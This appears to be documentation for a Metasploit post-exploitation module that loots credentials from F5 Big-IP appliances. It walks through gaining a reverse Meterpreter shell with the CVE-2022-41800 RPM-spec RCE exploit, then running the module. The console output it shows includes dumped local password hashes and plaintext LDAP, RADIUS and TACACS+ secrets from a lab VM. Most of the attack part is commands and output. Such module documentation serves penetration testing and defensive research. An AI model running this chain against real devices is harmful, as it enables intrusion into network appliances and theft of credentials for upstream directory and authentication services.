## Vulnerable Application

The application is F5 Big-IP, and I don't think the versions matters but I
tested on version 17.0.0.1. It can be downloaded as a VMWare image for free
(you have to create an account) from https://downloads.f5.com. You can register
for a free 30-day trial if you like, but it's not required to test this.

Boot the VM and set an admin password by logging in with the default credentials
(admin / admin). You'll need that password.

## Verification Steps

1. Install the application
2. Start `msfconsole`
3. Do: Get any session somehow (`exploit/linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800` works well on 17.0.0.1 and earlier, or just use `msfvenom` w/ a Linux payload)
4. Do: `use post/linux/gather/f5_loot_mcp`
5. Do `set SESSION <sessionid>`
6. Do: `run`
7. You should get the info

## Options

### GATHER_HASHES

If `true`, read a list of local users and passwords (`userdb_entry` values) from mcp.

Default: true

### GATHER_SERVICE_PASSWORDS

If `true`, read upstream service passwords (active directory, LDAP, etc) from different parts of mcp.

Default: true

### GATHER_DB_VARIABLES

If `true`, read configuration information from mcp (note that this is slow).

Default: false (due to the speed)

## Scenarios

### F5 Big-IP 17.0.0.1 with a root session

First, get a non-root session however you can. I used the rpmspec vuln:

```
msf6 > use exploit/linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set HttpPassword mybigtestpassword
HttpPassword => iagotestbigip
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set RHOST 10.0.0.162
RHOST => 10.0.0.162
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set LHOST 10.0.0.179
LHOST => 10.0.0.179
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > exploit
[*] Started reverse TCP handler on 10.0.0.179:4444 
[*] Sending stage (40168 bytes) to 10.0.0.162
[+] Deleted /var/config/rest/node/tmp/708677fa-5b30-43e6-9ce3-d84046e9f6e9.spec
[+] Deleted /var/config/rest/node/tmp/RPMS/noarch/yE15kZeAwp-1.6.1-7.4.4.noarch.rpm
[*] Meterpreter session 1 opened (10.0.0.179:4444 -> 10.0.0.162:36124) at 2022-11-14 16:12:04 -0800

meterpreter > bg
```

Then just use the module, set the SESSION, and run it:

```
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > use post/linux/gather/f5_loot_mcp
msf6 post(linux/gather/f5_loot_mcp) > set SESSION 1
SESSION => 1
msf6 post(linux/gather/f5_loot_mcp) > set VERBOSE true
VERBOSE => true
msf6 post(linux/gather/f5_loot_mcp) > show options

Module options (post/linux/gather/f5_loot_mcp):

   Name                       Current Setting  Required  Description
   ----                       ---------------  --------  -----------
   GATHER_DB_VARIABLES        false            yes       Gather database variables (warning: slow)
   GATHER_HASHES              true             yes       Gather password hashes from mcp
   GATHER_UPSTREAM_PASSWORDS  true             yes       Gather upstream passwords (ie, LDAP, AD, RADIUS, etc) from mcp
   SESSION                    1                yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(linux/gather/f5_loot_mcp) > run

[*] Gathering users and password hashes from mcp
[+] admin / $6$Iyzm/x1c$gvlmWSdmj7M/NBUM9DO41LHmC1qDBxM/IMjlUfqLZatVVXHPUvo9/hFDrP1Qg3qHIC0g.O9/dq4TPgDdE3W1z.
[+] f5hubblelcdadmin / qsVgr34GRROUnQhTSvL2h1Q6NtLE9hpp
[+] rontest / $6$vVUv0eWT$RGvezgWWLpEa5WfKNumg7b04w2cz87r8TAZ0mxiAvYveDmTRu3h3KUwirAhiFOZ6LcttWxO2XS0MNAhkqaSN11
[+] root / $6$hWKQCz3U$QE39QIT8ILbdah.k85LMnvKqjq3IIPge3bfM9UAiaUy.leyzHwpjYqQ7jJxSwN1PiFjKB28ofVi6rvenaxh9l/
[+] msftest10 / $6$SsTj4F5Q$ct0NRCUNGrAkIF7z/XSsUhF5DY1FwDgvGMxh6w09/Zm1jpu0Sj1v8LXRbEtuHlUrtaGMNGcRuU9EZYNjThEar0
[+] msftest11 / $6$5ls1Hodo$EdiV4XcuutsvYm8Aq6dTPUbxvukli4clH3b.tkLgITrrzOiaC5G8s2zVN/wmFiQ7udVAKUojVkxXuxMqzuWRK0
[+] msftest12 / $6$e7zpKgrJ$ifN.zbC/vLC3Y2cmecShUqDKt3JEYSruu0Dc73W9pQ0Vv1llCOjOV5gKL3CdxVK2r7LkCYDrH.zQEuMYDIV8s1
[+] msftest13 / $6$pgYIQtix$H8lIcppGqLH9i5gbKL5QMUpEreAmltXggZBtTgzRMB0iAWDgFsNw157hLg/2Oo9rO0o8HzysnigfFMhXIYoxy1
[+] msftest14 / $6$gIpu09NZ$I4N6fdzsisopw82SbJJLRf4tv2wpQrQlZaWcD2irlPlWHCzS8jJLEF9vxSQw4oGPebHzCvsZQqANAlubWubiq.
[+] msftest15 / $6$JPl9tzxV$/kXFRvw4u3vfZNn4HZ1kraxIz./Xj3OQXWYUnFvxUkB.2BzuZvHJHnaT7RyN4HnfNHdY1pLhvzSm9fvVJX6fs.
[+] rontest321 / $6$T2mT4PeYSuyg/hSr$y/rN9tol5t1fRxTBqFVtxLzRfUBXt16yNahqYTaVVZa3PITfoAKBnuzqvwBT77qNBV4JjgwdhzqmsMk78bo6d0
[+] Users and password hashes stored in /home/ron/.msf4/loot/20221123110850_default_10.0.0.162_f5.passwords_484560.txt
[*] Gathering upstream passwords from mcp
[*] Trying to fetch LDAP / Active Directory configuration
[*] Trying to fetch Radius configuration
[*] Trying to fetch TACACS+ configuration
[*] Trying to fetch SMTP configuration
[*] No SMTP password found
[+] LDAP: admin / myadpassword (server(s): ad.example.org)
[+] Radius secret: secret2 (server: myradiustest2.example.org)
[+] Radius secret: myradiussecret (server: myradiustest.example.org)
[+] TACACS+ secret: mytacacspassword (server(s): mytacacsserver.example.org, mytacacsserver2.example.org)
[+] Passwords stored in /home/ron/.msf4/loot/20221123110852_default_10.0.0.162_f5.service.passw_644261.txt
[*] Post module execution completed
```
